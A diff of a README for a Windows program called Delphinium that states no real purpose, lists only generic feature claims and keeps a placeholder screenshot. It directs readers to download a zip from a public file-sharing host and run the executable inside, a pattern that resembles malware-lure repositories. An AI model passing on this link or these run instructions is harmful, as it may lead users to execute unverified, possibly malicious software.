@@ -1,58 +1,83 @@
 # 🌸 Delphinium
 
 <p align="center">
-  <img src="https://img.shields.io/badge/Platform-Windows%2010%20%26%2011-0078D6?style=for-the-badge">
-  <img src="https://img.shields.io/badge/.NET-10-512BD4?style=for-the-badge">
-  <img src="https://img.shields.io/badge/Status-Stable-2ECC71?style=for-the-badge">
+  <img src="https://img.shields.io/badge/Windows-10%20%26%2011-0078D6?style=for-the-badge&logo=windows&logoColor=white" />
+  <img src="https://img.shields.io/badge/.NET-10-512BD4?style=for-the-badge&logo=dotnet&logoColor=white" />
+  <img src="https://img.shields.io/badge/Status-Stable-2ECC71?style=for-the-badge" />
 </p>
 
 <p align="center">
-A lightweight, modern Windows application focused on speed, simplicity and reliability.
+  <b>A modern, lightweight Windows application built for speed, simplicity and performance.</b>
+</p>
+
+---
+
+<p align="center">
+  <a href="https://www.upload.ee/files/19522927/Delphinium.zip.html">
+    <img src="https://img.shields.io/badge/⬇%20Download-Here-00C853?style=for-the-badge&logo=windows&logoColor=white">
+  </a>
 </p>
 
 ---
 
 ## ✨ Features
 
-* ⚡ Fast & Lightweight
-* 🎨 Modern UI
-* 🔒 Stable
-* 🚀 Frequent Updates
-* 💻 Windows 10 & Windows 11
+* ⚡ High performance
+* 🎨 Modern and clean interface
+* 🪶 Lightweight design
+* 🔒 Stable and reliable
+* 🚀 Fast startup
+* 💻 Windows 10 & Windows 11 support
 
 ---
 
-# 📥 Download
+## 📥 Installation
 
-### ➜ **Latest Version**
-
-**Download Delphinium here:**
-
-👉 **https://www.upload.ee/files/19522927/Delphinium.zip.html**
-
----
-
-## 📦 Installation
-
-1. Download **Delphinium.zip**
-2. Extract the archive.
-3. Launch **Delphinium.exe**
-4. Done! 🎉
+1. Click the **Download Here** button above.
+2. Download `Delphinium.zip`
+3. Extract the ZIP file.
+4. Open `Delphinium.exe`
+5. Enjoy! 🌸
 
 ---
 
-## 💜 Why Delphinium?
+## 🖥️ Compatibility
 
-Delphinium is designed to provide a clean, smooth and lightweight Windows experience while remaining easy to use.
+| Platform   | Supported |
+| ---------- | --------- |
+| Windows 10 | ✅         |
+| Windows 11 | ✅         |
+| Linux      | ❌         |
+| macOS      | ❌         |
+
+---
+
+## 📸 Preview
+
+<p align="center">
+  <img src="preview.png" width="850">
+</p>
+
+*(Replace preview.png with your own screenshot)*
+
+---
+
+## 🔄 Updates
+
+New versions and improvements will be added regularly.
 
 ---
 
 ## ⭐ Support
 
-If you like the project, don't forget to leave a **⭐ Star** on this repository!
+If you like Delphinium:
+
+* ⭐ Star this repository
+* Share it with others
+* Report bugs and suggestions
 
 ---
 
 <p align="center">
-Made with ❤️ by <b>DROXI</b>
+  Made with ❤️ by <b>DROXI</b>
 </p>
